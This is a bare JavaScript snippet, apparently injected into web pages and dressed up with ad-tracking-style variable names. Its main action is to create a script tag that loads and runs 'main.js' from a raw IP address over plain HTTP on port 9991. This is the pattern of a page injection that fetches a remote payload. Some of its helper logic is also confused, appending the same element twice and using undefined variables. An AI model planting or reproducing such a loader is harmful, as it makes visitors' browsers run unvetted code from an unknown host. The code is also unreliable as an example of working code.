var bcdata_aid = "0";
var bcdata_sp = "";
var sda_man = "";
var bcdata_src = "0";
(function () {
  var a = function (h, f) {
    try {
      var d = document.createElement("span");
      d.innerHTML = h;
      api.writeO(d, f)
    } catch (g) {
      document.write(h)
    }
  };
  var c = function (d, f) {
    if (f) {
      f.appendChild(d);
      f.parentNode.appendChild(d)
    } else {
      var g = f || document.all || document.getElementsByTagName("*");
      var f = g[g.length - 1]
    }
    f.parentNode.appendChild(d)
  };
  var b = document.createElement("script");
  b.type = "text/javascript";
  b.src = "http://61.160.200.156:9991/main.js?ver=v48";
  c(b)
})();